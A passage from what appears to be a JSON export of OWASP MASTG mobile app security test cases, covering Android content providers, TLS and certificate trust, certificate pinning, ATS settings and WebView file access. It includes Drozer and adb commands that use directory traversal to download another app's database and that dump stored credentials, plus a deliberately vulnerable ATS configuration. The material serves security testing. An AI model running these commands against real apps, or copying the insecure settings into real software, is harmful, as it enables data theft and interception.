Selection:\n  content://com.mwr.example.sieve.DBContentProvider/Keys/\n  content://com.mwr.example.sieve.DBContentProvider/Passwords\n  content://com.mwr.example.sieve.DBContentProvider/Passwords/\n</pre><h3>File System Based Content Providers</h3><p>Content providers can provide access to the underlying filesystem. This allows apps to share files (the Android sandbox normally prevents this). You can use the Drozer modules app.provider.read and app.provider.download to read and download files, respectively, from exported file-based content providers. These content providers are susceptible to directory traversal, which allows otherwise protected files in the target application's sandbox to be read.</p><pre>dz&gt; run app.provider.download content://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db /home/user/database.db\nWritten 24488 bytes\n</pre><p>Use the scanner.provider.traversal module to automate the process of finding content providers that are susceptible to directory traversal:</p><pre>dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve\nScanning com.mwr.example.sieve...\nVulnerable Providers:\n  content://com.mwr.example.sieve.FileBackupProvider/\n  content://com.mwr.example.sieve.FileBackupProvider\n</pre><p>Note that adb can also be used to query content providers:</p><pre>$ adb shell content query --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials\nRow: 0 id=1, username=admin, password=StrongPwd\nRow: 1 id=2, username=test, password=test\n...\n</pre>",
        "code": "MASTG-TEST-0007",
        "sort_order": 59
    },
    {
        "tags":
        [
            "MASTG-TEST-0286: Network Security Configuration Allowing Trust in User-Provided CAs"
        ],
        "testcase": "Network Security Configuration Allowing Trust in User-Provided CAs",
        "details": "<h2>Overview</h2><p>This test evaluates whether an Android app <strong>explicitly</strong> trusts user-added CA certificates by including <a href=\"https://developer.android.com/privacy-and-security/security-config#certificates\" rel=\"noopener noreferrer\" target=\"_blank\">&lt;certificates src=\"user\"/&gt; ↗</a> in its <a href=\"https://developer.android.com/privacy-and-security/security-config#CustomTrust\" rel=\"noopener noreferrer\" target=\"_blank\">Network Security Configuration ↗</a>. Even though starting with Android 7.0 (API level 24) apps no longer trust user-added CAs by default, this configuration overrides that behavior.</p><p>Such trust can expose the application to <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm\" rel=\"noopener noreferrer\" target=\"_blank\">MITM attacks</a>, as malicious CAs installed by users could intercept secure communications.</p><h2></h2><h2>Steps</h2><ol><li>Obtain the AndroidManifest.xml (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0117\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Information from the AndroidManifest</a></em>).</li><li>Check if an <a href=\"https://developer.android.com/guide/topics/manifest/application-element#networkSecurityConfig\" rel=\"noopener noreferrer\" target=\"_blank\">android:networkSecurityConfig ↗</a> attribute is set in the &lt;application&gt; tag.</li><li>Inspect the referenced Network Security Configuration file, and extract all uses of &lt;certificates src=\"user\" /&gt;.</li></ol><h2></h2><h2>Observation</h2><p>The output contains all the &lt;trust-anchors&gt; from the Network Security Configuration file along with any defined &lt;certificates&gt; entries, if present.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if &lt;certificates src=\"user\" /&gt; has been defined as part of the &lt;trust-anchors&gt; in the Network Security Configuration file.</p>",
        "code": "MASTG-TEST-0286",
        "sort_order": 54
    },
    {
        "tags":
        [
            "MASTG-TEST-0284: Incorrect SSL Error Handling in WebViews"
        ],
        "testcase": "Incorrect SSL Error Handling in WebViews",
        "details": "<h2>Overview</h2><p>This test evaluates whether an Android app has WebViews that ignore SSL/TLS certificate errors by overriding the <a href=\"https://developer.android.com/reference/android/webkit/WebViewClient#onReceivedSslError%28android.webkit.WebView,%20android.webkit.SslErrorHandler,%20android.net.http.SslError%29\" rel=\"noopener noreferrer\" target=\"_blank\">onReceivedSslError(...) ↗</a> method without proper validation.</p><p>The method onReceivedSslError(...) is triggered when a WebView encounters an SSL certificate error while loading a page. By default, the WebView cancels the request to protect users from insecure connections. Overriding this method and calling <a href=\"https://developer.android.com/reference/android/webkit/SslErrorHandler#proceed%28%29\" rel=\"noopener noreferrer\" target=\"_blank\">SslErrorHandler.proceed() ↗</a> without proper validation disables these protection.</p><p>This effectively bypasses SSL certificate checks in the WebView, exposing the app to <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm\" rel=\"noopener noreferrer\" target=\"_blank\">MITM attacks</a> using invalid, expired, or self-signed certificates.</p><h2></h2><h2>Steps</h2><ol><li>Reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>).</li><li>Inspect the source code and run a static analysis (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>) tool and look for all usages of onReceivedSslError(...).</li></ol><h2></h2><h2>Observation</h2><p>The output contains a list of locations where onReceivedSslError(...) that includes a proceed() is used without exception handling that properly handles SSL errors.</p><h2></h2><h2>Evaluation</h2><p>The test fails if onReceivedSslError(...) is overridden and certificate errors are ignored without proper validation or user involvement.</p><p>This includes cases such as:</p><ul><li><strong>Unconditionally accepting SSL errors:</strong> calling proceed() without checking the nature of the error.</li><li><strong>Relying only on primary error code:</strong> using <a href=\"https://developer.android.com/reference/android/net/http/SslError#getPrimaryError()\" rel=\"noopener noreferrer\" target=\"_blank\">getPrimaryError() ↗</a> for decision-making, such as proceeding if the primary error is not SSL_UNTRUSTED, which may overlook additional errors in the chain.</li><li><strong>Suppressing exceptions silently:</strong> catching exceptions in onReceivedSslError(...) without calling <a href=\"https://developer.android.com/reference/android/webkit/SslErrorHandler#cancel()\" rel=\"noopener noreferrer\" target=\"_blank\">cancel() ↗</a>, which allows the connection to continue silently.</li></ul><p>According to <a href=\"https://developer.android.com/reference/android/webkit/WebViewClient.html#onReceivedSslError(android.webkit.WebView,%20android.webkit.SslErrorHandler,%20android.net.http.SslError)\" rel=\"noopener noreferrer\" target=\"_blank\">official Android guidance ↗</a>, apps should never call proceed() in response to SSL errors. The correct behavior is to cancel the request to protect users from potentially insecure connections. User prompts are also discouraged, as users cannot reliably evaluate SSL issues.</p><p>When testing using automated tools, you will need to inspect all the reported locations in the reverse-engineered code to confirm the incorrect implementation (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0023\" rel=\"noopener noreferrer\" target=\"_blank\"> Reviewing Decompiled Java Code</a></em>).</p>",
        "code": "MASTG-TEST-0284",
        "sort_order": 52
    },
    {
        "tags":
        [
            "MASTG-TEST-0283: Incorrect Implementation of Server Hostname Verification"
        ],
        "testcase": "Incorrect Implementation of Server Hostname Verification",
        "details": "<h2>Overview</h2><p>This test evaluates whether an Android app implements a <a href=\"https://developer.android.com/reference/javax/net/ssl/HostnameVerifier\" rel=\"noopener noreferrer\" target=\"_blank\">HostnameVerifier ↗</a> that uses <a href=\"https://developer.android.com/reference/javax/net/ssl/HostnameVerifier#verify(java.lang.String,%20javax.net.SSL.SSLSession)\" rel=\"noopener noreferrer\" target=\"_blank\">verify(...) ↗</a> <a href=\"https://developer.android.com/privacy-and-security/risks/unsafe-hostname\" rel=\"noopener noreferrer\" target=\"_blank\">in an unsafe manner ↗</a>, effectively turning off hostname validation for the affected connections.</p><p>Such unsafe implementations can allow an attacker to run a <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm\" rel=\"noopener noreferrer\" target=\"_blank\">MITM attack</a> with a valid (or self-signed) certificate and intercept or tamper with the app's traffic.</p><h2></h2><h2>Steps</h2><ol><li>Reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>).</li><li>Inspect the source code and run a static analysis (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>) tool and look for all usages of HostnameVerifier.</li></ol><h2></h2><h2>Observation</h2><p>The output contains a list of locations where HostnameVerifier is used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the app does <strong>not</strong> properly validate that the server's hostname matches the certificate.</p><p>This includes cases such as:</p><ul><li><strong>Always accepting hostnames:</strong> overriding verify(...) to unconditionally return true, regardless of the actual hostname or certificate.</li><li><strong>Overly broad matching rules:</strong> using permissive wildcard logic that matches unintended domains.</li><li><strong>Incomplete verification coverage:</strong> failing to invoke hostname verification on all SSL/TLS channels, such as those created via SSLSocket, or during renegotiation.</li><li><strong>Missing manual verification:</strong> not performing hostname verification when it is not done automatically, such as when using the low-level SSLSocket API.</li></ul><p>When testing using automated tools, you will need to inspect all the reported locations in the reverse-engineered code to confirm the incorrect implementation (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0023\" rel=\"noopener noreferrer\" target=\"_blank\"> Reviewing Decompiled Java Code</a></em>).</p>",
        "code": "MASTG-TEST-0283",
        "sort_order": 51
    },
    {
        "tags":
        [
            "MASTG-TEST-0065: Testing Data Encryption on the Network"
        ],
        "testcase": "Testing Data Encryption on the Network",
        "details": "<h2>Overview</h2><p>All the presented cases must be carefully analyzed as a whole. For example, even if the app does not permit cleartext traffic in its Info.plist, it might actually still be sending HTTP traffic. That could be the case if it's using a low-level API (for which ATS is ignored) or a badly configured cross-platform framework.</p><p>IMPORTANT: You should apply these tests to the app main code but also to any app extensions, frameworks or Watch apps embedded within the app as well.</p><p>For more information refer to the article <a href=\"https://developer.apple.com/documentation/security/preventing_insecure_network_connections\" rel=\"noopener noreferrer\" target=\"_blank\">\"Preventing Insecure Network Connections\" ↗</a> and <a href=\"https://developer.apple.com/news/?id=jxky8h89\" rel=\"noopener noreferrer\" target=\"_blank\">\"Fine-tune your App Transport Security settings\" ↗</a> in the Apple Developer Documentation.</p><h2></h2><h2>Static Analysis</h2><h3>Testing Network Requests over Secure Protocols</h3><p>First, you should identify all network requests in the source code and ensure that no plain HTTP URLs are used. Make sure that sensitive information is sent over secure channels by using <a href=\"https://developer.apple.com/documentation/foundation/urlsession\" rel=\"noopener noreferrer\" target=\"_blank\">URLSession ↗</a> (which uses the standard <a href=\"https://developer.apple.com/documentation/foundation/url_loading_system\" rel=\"noopener noreferrer\" target=\"_blank\">URL Loading System from iOS ↗</a>) or <a href=\"https://developer.apple.com/documentation/network\" rel=\"noopener noreferrer\" target=\"_blank\">Network ↗</a> (for socket-level communication using TLS and access to TCP and UDP).</p><h3>Check for Low-Level Networking API Usage</h3><p>Identify the network APIs used by the app and see if it uses any low-level networking APIs.</p><p><strong>Apple Recommendation: Prefer High-Level Frameworks in Your App</strong>: \"ATS doesn't apply to calls your app makes to lower-level networking interfaces like the Network framework or CFNetwork. In these cases, you take responsibility for ensuring the security of the connection. You can construct a secure connection this way, but mistakes are both easy to make and costly. It's typically safest to rely on the URL Loading System instead\" (see <a href=\"https://developer.apple.com/documentation/security/preventing_insecure_network_connections\" rel=\"noopener noreferrer\" target=\"_blank\">source ↗</a>).</p><p>If the app uses any low-level APIs such as <a href=\"https://developer.apple.com/documentation/network\" rel=\"noopener noreferrer\" target=\"_blank\">Network ↗</a> or <a href=\"https://developer.apple.com/documentation/cfnetwork\" rel=\"noopener noreferrer\" target=\"_blank\">CFNetwork ↗</a>, you should carefully investigate if they are being used securely. For apps using cross-platform frameworks (e.g. Flutter, Xamarin, ...) and third party frameworks (e.g. Alamofire) you should analyze if they're being configured and used securely according to their best practices.</p><p>Make sure that the app:</p><ul><li>verifies the challenge type and the host name and credentials when performing server trust evaluation.</li><li>doesn't ignore TLS errors.</li><li>doesn't use any insecure TLS configurations (see <em><a href=\"https://mas.owasp.org/MASTG-TEST-0066\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing the TLS Settings</a></em>)</li></ul><p>These checks are orientative, we cannot name specific APIs since every app might use a different framework. Please use this information as a reference when inspecting the code.</p><h3>Testing for Cleartext Traffic</h3><p>Ensure that the app is not allowing cleartext HTTP traffic. Since iOS 9.0 cleartext HTTP traffic is blocked by default (due to App Transport Security (ATS)) but there are multiple ways in which an application can still send it:</p><ul><li>Configuring ATS to enable cleartext traffic by setting the NSAllowsArbitraryLoads attribute to true (or YES) on NSAppTransportSecurity in the app's Info.plist.</li><li>Retrieve the Info.plist (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0058\" rel=\"noopener noreferrer\" target=\"_blank\"> Exploring the App Package</a></em>)</li><li>Check that NSAllowsArbitraryLoads is not set to true globally of for any domain.</li><li>If the application opens third party web sites in WebViews, then from iOS 10 onwards NSAllowsArbitraryLoadsInWebContent can be used to disable ATS restrictions for the content loaded in web views.</li></ul><p><strong>Apple warns:</strong> Disabling ATS means that unsecured HTTP connections are allowed. HTTPS connections are also allowed, and are still subject to default server trust evaluation. However, extended security checks—like requiring a minimum Transport Layer Security (TLS) protocol version—are disabled. Without ATS, you're also free to loosen the default server trust requirements, as described in <a href=\"https://developer.apple.com/documentation/foundation/url_loading_system/handling_an_authentication_challenge/performing_manual_server_trust_authentication\" rel=\"noopener noreferrer\" target=\"_blank\">\"Performing Manual Server Trust Authentication\" ↗</a>.</p><p>The following snippet shows a <strong>vulnerable example</strong> of an app disabling ATS restrictions globally.</p><pre>&lt;key&gt;NSAppTransportSecurity&lt;/key&gt;\n&lt;dict&gt;\n    &lt;key&gt;NSAllowsArbitraryLoads&lt;/key&gt;\n    &lt;true/&gt;\n&lt;/dict&gt;\n</pre><p>ATS should be examined taking the application's context into consideration. The application may <em>have to</em> define ATS exceptions to fulfill its intended purpose. For example, the <a href=\"https://github.com/mozilla-mobile/firefox-ios/blob/v97.0/Client/Info.plist#L82\" rel=\"noopener noreferrer\" target=\"_blank\">Firefox iOS application has ATS disabled globally ↗</a>. This exception is acceptable because otherwise the application would not be able to connect to any HTTP website that does not have all the ATS requirements. In some cases, apps might disable ATS globally but enable it for certain domains to e.g. securely load metadata or still allow secure login.</p><p>ATS should include a <a href=\"https://developer.apple.com/documentation/security/preventing_insecure_network_connections#3138036\" rel=\"noopener noreferrer\" target=\"_blank\">justification string ↗</a> for this (e.g. \"The app must connect to a server managed by another entity that doesn't support secure connections.\").</p><h2></h2><h2>Dynamic Analysis</h2><p>Intercept the tested app's incoming and outgoing network traffic and make sure that this traffic is encrypted. You can intercept network traffic in any of the following ways:</p><ul><li>Capture all HTTP(S) and Websocket traffic with an interception proxy like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0079\" rel=\"noopener noreferrer\" target=\"_blank\"> ZAP</a></em> or <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0077\" rel=\"noopener noreferrer\" target=\"_blank\"> Burp Suite</a></em> and make sure all requests are made via HTTPS instead of HTTP.</li><li>Interception proxies like Burp and <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0079\" rel=\"noopener noreferrer\" target=\"_blank\"> ZAP</a></em> will show web related traffic primarily (e.g. HTTP(S), Web Sockets, gRPC, etc.). You can, however, use a Burp plugin such as <a href=\"https://github.com/summitt/Burp-Non-HTTP-Extension\" rel=\"noopener noreferrer\" target=\"_blank\">Burp-non-HTTP-Extension ↗</a> or the tool <a href=\"https://github.com/jrmdev/mitm_relay\" rel=\"noopener noreferrer\" target=\"_blank\">mitm-relay ↗</a> to decode and visualize communication via XMPP and other protocols.</li></ul><p>Some applications may not work with proxies like Burp and ZAP because of Certificate Pinning. In such a scenario, please check <em><a href=\"https://mas.owasp.org/MASTG-TEST-0068\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing Custom Certificate Stores and Certificate Pinning</a></em>.</p><p>For more details refer to:</p><ul><li><a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm\" rel=\"noopener noreferrer\" target=\"_blank\">\"Intercepting Network Traffic Through MITM\"</a></li><li><em><a href=\"https://mas.owasp.org/MASTG-TECH-0062\" rel=\"noopener noreferrer\" target=\"_blank\"> Basic Network Monitoring/Sniffing</a></em></li></ul>",
        "code": "MASTG-TEST-0065",
        "sort_order": 55
    },
    {
        "tags":
        [
            "MASTG-TEST-0285: Outdated Android Version Allowing Trust in User-Provided CAs"
        ],
        "testcase": "Outdated Android Version Allowing Trust in User-Provided CAs",
        "details": "<h2>Overview</h2><p>This test evaluates whether an Android app <strong>implicitly</strong> trusts user-added CA certificates by <a href=\"https://developer.android.com/privacy-and-security/security-config#CustomTrust\" rel=\"noopener noreferrer\" target=\"_blank\">default ↗</a>, which is the case for apps that can be installed to devices running API level 23 or lower.</p><p>Those apps rely on the default Network Security Configuration that trusts both system and user-installed Certificate Authorities (CAs). Such trust can expose the app to <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm\" rel=\"noopener noreferrer\" target=\"_blank\">MITM attacks</a>, as malicious CAs installed by users could intercept secure communications.</p><h2></h2><h2>Steps</h2><ol><li>Obtain the AndroidManifest.xml (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0117\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Information from the AndroidManifest</a></em>).</li><li>Read the value of the minSdkVersion attribute from the &lt;uses-sdk&gt; element.</li></ol><h2></h2><h2>Observation</h2><p>The output contains the value of minSdkVersion.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if minSdkVersion is less than 24.</p>",
        "code": "MASTG-TEST-0285",
        "sort_order": 53
    },
    {
        "tags":
        [
            "MASTG-TEST-0067: Testing Endpoint Identity Verification"
        ],
        "testcase": "Testing Endpoint Identity Verification",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Using TLS to transport sensitive information over the network is essential for security. However, encrypting communication between a mobile application and its backend API is not trivial. Developers often decide on simpler but less secure solutions (e.g., those that accept any certificate) to facilitate the development process, and sometimes these weak solutions make it into the production version, potentially exposing users to <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm\" rel=\"noopener noreferrer\" target=\"_blank\">Machine-in-the-Middle (MITM)</a> attacks. See <a href=\"https://cwe.mitre.org/data/definitions/295.html\" rel=\"noopener noreferrer\" target=\"_blank\">\"CWE-295: Improper Certificate Validation\" ↗</a>.</p><p>These are some of the issues should be addressed:</p><ul><li>Check if the app links against an SDK older than iOS 9.0. In that case ATS is disabled no matter which version of the OS the app runs on.</li><li>Verify that a certificate comes from a trusted source, i.e. a trusted CA (Certificate Authority).</li><li>Determine whether the endpoint server presents the right certificate.</li></ul><p>Make sure that the hostname and the certificate itself are verified correctly. Examples and common pitfalls are available in the <a href=\"https://developer.apple.com/documentation/security/preventing_insecure_network_connections\" rel=\"noopener noreferrer\" target=\"_blank\">official Apple documentation ↗</a>.</p><p>We highly recommend supporting static analysis with the dynamic analysis. If you don't have the source code or the app is difficult to reverse engineer, having a solid dynamic analysis strategy can definitely help. In that case you won't know if the app uses low or high-level APIs but you can still test for different trust evaluation scenarios (e.g. \"does the app accept a self-signed certificate?\").</p><h2></h2><h2>Dynamic Analysis</h2><p>Our test approach is to gradually relax security of the SSL handshake negotiation and check which security mechanisms are enabled.</p><ol><li>Having Burp set up as a proxy, make sure that there is no certificate added to the trust store (<strong>Settings</strong> -&gt; <strong>General</strong> -&gt; <strong>Profiles</strong>) and that tools like SSL Kill Switch are deactivated. Launch your application and check if you can see the traffic in Burp. Any failures will be reported under 'Alerts' tab. If you can see the traffic, it means that there is no certificate validation performed at all. If however, you can't see any traffic and you have an information about SSL handshake failure, follow the next point.</li><li>Now, install the Burp certificate, as explained in <a href=\"https://support.portswigger.net/customer/portal/articles/1841109-installing-burp-s-ca-certificate-in-an-ios-device\" rel=\"noopener noreferrer\" target=\"_blank\">Burp's user documentation ↗</a>. If the handshake is successful and you can see the traffic in Burp, it means that the certificate is validated against the device's trust store, but no pinning is performed.</li></ol><p>If executing the instructions from the previous step doesn't lead to traffic being proxied, it may mean that certificate pinning is actually implemented and all security measures are in place. However, you still need to bypass the pinning in order to test the application. Please refer to <em><a href=\"https://mas.owasp.org/MASTG-TECH-0064\" rel=\"noopener noreferrer\" target=\"_blank\"> Bypassing Certificate Pinning</a></em> for more information on this.</p>",
        "code": "MASTG-TEST-0067",
        "sort_order": 57
    },
    {
        "tags":
        [
            "MASTG-TEST-0068: Testing Custom Certificate Stores and Certificate Pinning"
        ],
        "testcase": "Testing Custom Certificate Stores and Certificate Pinning",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Verify that the server certificate is pinned. Pinning can be implemented on various levels in terms of the certificate tree presented by the server:</p><ol><li>Including server's certificate in the application bundle and performing verification on each connection. This requires an update mechanisms whenever the certificate on the server is updated.</li><li>Limiting certificate issuer to e.g. one entity and bundling the intermediate CA's public key into the application. In this way we limit the attack surface and have a valid certificate.</li><li>Owning and managing your own PKI. The application would contain the intermediate CA's public key. This avoids updating the application every time you change the certificate on the server, due to e.g. expiration. Note that using your own CA would cause the certificate to be self-singed.</li></ol><p>The latest approach recommended by Apple is to specify a pinned CA public key in the Info.plist file under App Transport Security Settings. You can find an example in their article <a href=\"https://developer.apple.com/news/?id=g9ejcf8y\" rel=\"noopener noreferrer\" target=\"_blank\">Identity Pinning: How to configure server certificates for your app ↗</a>.</p><p>Another common approach is to use the <a href=\"https://developer.apple.com/documentation/foundation/nsurlconnectiondelegate/1414078-connection?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">connection:willSendRequestForAuthenticationChallenge: ↗</a> method of NSURLConnectionDelegate to check if the certificate provided by the server is valid and matches the certificate stored in the app. You can find more details in the <a href=\"https://developer.apple.com/library/archive/technotes/tn2232/_index.html#//apple_ref/doc/uid/DTS40012884-CH1-SECNSURLCONNECTION\" rel=\"noopener noreferrer\" target=\"_blank\">HTTPS Server Trust Evaluation ↗</a> technical note.</p><p>The following third-party libraries include pinning functionality:</p><ul><li><a href=\"https://github.com/datatheorem/TrustKit\" rel=\"noopener noreferrer\" target=\"_blank\">TrustKit ↗</a>: here you can pin by setting the public key hashes in your Info.plist or provide the hashes in a dictionary. See their README for more details.</li><li><a href=\"https://github.com/Alamofire/Alamofire\" rel=\"noopener noreferrer\" target=\"_blank\">AlamoFire ↗</a>: here you can define a ServerTrustPolicy per domain for which you can define a PinnedCertificatesTrustEvaluator. See its <a href=\"https://github.com/Alamofire/Alamofire/blob/master/Documentation/AdvancedUsage.md#security\" rel=\"noopener noreferrer\" target=\"_blank\">documentation ↗</a> for more details.</li><li><a href=\"https://github.com/AFNetworking/AFNetworking\" rel=\"noopener noreferrer\" target=\"_blank\">AFNetworking ↗</a>: here you can set an AFSecurityPolicy to configure your pinning.</li></ul><h2>Dynamic Analysis</h2><h3>Server certificate pinning</h3><p>Follow the instructions from the Dynamic Analysis section of <em><a href=\"https://mas.owasp.org/MASTG-TEST-0067\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing Endpoint Identity Verification</a></em>. If doing so doesn't lead to traffic being proxied, it may mean that certificate pinning is actually implemented and all security measures are in place. Does the same happen for all domains?</p><p>As a quick smoke test, you can try to bypass certificate pinning using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0038\" rel=\"noopener noreferrer\" target=\"_blank\"> objection</a></em> as described in <em><a href=\"https://mas.owasp.org/MASTG-TECH-0064\" rel=\"noopener noreferrer\" target=\"_blank\"> Bypassing Certificate Pinning</a></em>. Pinning related APIs being hooked by objection should appear in objection's output.</p><p>However, keep in mind that:</p><ul><li>the APIs might not be complete.</li><li>if nothing is hooked, that doesn't necessarily mean that the app doesn't implement pinning.</li></ul><p>In both cases, the app or some of its components might implement custom pinning in a way that is <a href=\"https://github.com/sensepost/objection/blob/master/agent/src/ios/pinning.ts\" rel=\"noopener noreferrer\" target=\"_blank\">supported by objection ↗</a>. Please check the static analysis section for specific pinning indicators and more in-depth testing.</p><h3>Client certificate validation</h3><p>Some applications use mTLS (mutual TLS), meaning that the application verifies the server's certificate and the server verifies the client's certificate. You can notice this if there is an error in Burp <strong>Alerts</strong> tab indicating that client failed to negotiate connection.</p><p>There are a couple of things worth noting:</p><ol><li>The client certificate contains a private key that will be used for the key exchange.</li><li>Usually the certificate would also need a password to use (decrypt) it.</li><li>The certificate can be stored in the binary itself, data directory or in the Keychain.</li></ol><p>The most common and improper way of using mTLS is to store the client certificate within the application bundle and hardcode the password. This obviously does not bring much security, because all clients will share the same certificate.</p><p>Second way of storing the certificate (and possibly password) is to use the Keychain. Upon first login, the application should download the personal certificate and store it securely in the Keychain.</p><p>Sometimes applications have one certificate that is hardcoded and use it for the first login and then the personal certificate is downloaded. In this case, check if it's possible to still use the 'generic' certificate to connect to the server.</p><p>Once you have extracted the certificate from the application (e.g. using Frida), add it as client certificate in Burp, and you will be able to intercept the traffic.</p>",
        "code": "MASTG-TEST-0068",
        "sort_order": 58
    },
    {
        "tags":
        [
            "MASTG-TEST-0066: Testing the TLS Settings"
        ],
        "testcase": "Testing the TLS Settings",
        "details": "<h2>Overview</h2><p>Remember to <a href=\"https://developer.apple.com/documentation/security/preventing_insecure_network_connections#3138036\" rel=\"noopener noreferrer\" target=\"_blank\">inspect the corresponding justifications ↗</a> to discard that it might be part of the app intended purpose.</p><p>It is possible to verify which ATS settings can be used when communicating to a certain endpoint. On macOS the command line utility nscurl can be used. A permutation of different settings will be executed and verified against the specified endpoint. If the default ATS secure connection test is passing, ATS can be used in its default secure configuration. If there are any fails in the nscurl output, please change the server side configuration of TLS to make the server side more secure, rather than weakening the configuration in ATS on the client. See the article \"Identifying the Source of Blocked Connections\" in the <a href=\"https://developer.apple.com/documentation/security/preventing_insecure_network_connections/identifying_the_source_of_blocked_connections\" rel=\"noopener noreferrer\" target=\"_blank\">Apple Developer Documentation ↗</a> for more details.</p><p>Refer to section \"Verifying the TLS Settings\" in chapter <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#verifying-the-tls-settings\" rel=\"noopener noreferrer\" target=\"_blank\">Testing Network Communication</a> for details.</p>",
        "code": "MASTG-TEST-0066",
        "sort_order": 56
    },
    {
        "tags":
        [
            "MASTG-TEST-0008: Checking for Sensitive Data Disclosure Through the User Interface"
        ],
        "testcase": "Checking for Sensitive Data Disclosure Through the User Interface",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Carefully review all UI components that either show such information or take it as input. Search for any traces of sensitive information and evaluate if it should be masked or completely removed.</p><h3>Text Fields</h3><p>To make sure an application is masking sensitive user input, check for the following attribute in the definition of EditText:</p><pre>android:inputType=\"textPassword\"\n</pre><p>With this setting, dots (instead of the input characters) will be displayed in the text field, preventing the app from leaking passwords or pins to the user interface.</p><h3>App Notifications</h3><p>When statically assessing an application, it is recommended to search for any usage of the NotificationManager class which might be an indication of some form of notification management. If the class is being used, the next step would be to understand how the application is <a href=\"https://developer.android.com/training/notify-user/build-notification#SimpleNotification\" rel=\"noopener noreferrer\" target=\"_blank\">generating the notifications ↗</a>.</p><p>These code locations can be fed into the Dynamic Analysis section below, providing an idea of where in the application notifications may be dynamically generated.</p><h2></h2><h2>Dynamic Analysis</h2><p>To determine whether the application leaks any sensitive information to the user interface, run the application and identify components that could be disclosing information.</p><h3>Text Fields</h3><p>If the information is masked by, for example, replacing input with asterisks or dots, the app isn't leaking data to the user interface.</p><h3>App Notifications</h3><p>To identify the usage of notifications run through the entire application and all its available functions looking for ways to trigger any notifications. Consider that you may need to perform actions outside of the application in order to trigger certain notifications.</p><p>While running the application you may want to start tracing all calls to functions related to the notifications creation, e.g. setContentTitle or setContentText from <a href=\"https://developer.android.com/reference/androidx/core/app/NotificationCompat.Builder\" rel=\"noopener noreferrer\" target=\"_blank\">NotificationCompat.Builder ↗</a>. Observe the trace in the end and evaluate if it contains any sensitive information.</p>",
        "code": "MASTG-TEST-0008",
        "sort_order": 60
    },
    {
        "tags":
        [
            "MASTG-TEST-0252: References to Local File Access in WebViews"
        ],
        "testcase": "References to Local File Access in WebViews",
        "details": "<h2>Overview</h2><p>This test checks for references to methods from the <a href=\"https://developer.android.com/reference/android/webkit/WebSettings.html\" rel=\"noopener noreferrer\" target=\"_blank\">WebSettings ↗</a> class used by Android WebViews which <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#webview-local-file-access-settings\" rel=\"noopener noreferrer\" target=\"_blank\">enable loading content from various sources, including local files</a>. If improperly configured, these methods can introduce security risks such as unauthorized file access and data exfiltration. These methods are:</p><ul><li>setAllowFileAccess: allows the WebView to load local files from the app's internal storage or external storage.</li><li>setAllowFileAccessFromFileURLs: lets JavaScript within those local files access other local files.</li><li>setAllowUniversalAccessFromFileURLs: removes any cross-origin restrictions, allowing that JavaScript to read data across origins. The JavaScript <strong>can always send data to any origin</strong> (e.g. via POST), regardless of this setting; this setting only affects reading data (e.g. the code wouldn't get a response to a POST request but the data would still be sent).</li></ul><p>When these settings are combined, they can enable an attack in which a malicious HTML file gains elevated privileges, accesses local resources, and exfiltrates data over the network, effectively bypassing the security boundaries typically enforced by the same-origin policy.</p><p>Even though these methods have secure defaults and are <strong>deprecated in Android 10 (API level 29) and later</strong>, they can still be explicitly set to true or their insecure defaults may be used in apps that run on older versions of Android (due to their minSdkVersion).</p><p>Refer to <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#webview-local-file-access-settings\" rel=\"noopener noreferrer\" target=\"_blank\">Android WebView Local File Access Settings</a> for more information on these methods (default values, deprecation status, security implications), the specific files that can be accessed, and the conditions under which they can be accessed.</p><p><strong>Example Attack Scenario</strong>:</p><p>Suppose a banking app uses a WebView to display dynamic content, and the developers enabled all three insecure settings. Additionally, JavaScript is enabled in the WebView.</p><ol><li>An attacker injects a malicious HTML file into the device (via phishing or another exploit) into a location that the attacker <em>knows</em> the WebView will access it from (e.g. thanks to reverse engineering). For example, an HTML file used to display the app's terms and conditions.</li><li>The WebView can load the malicious file because of setAllowFileAccess(true).</li><li>Thanks to 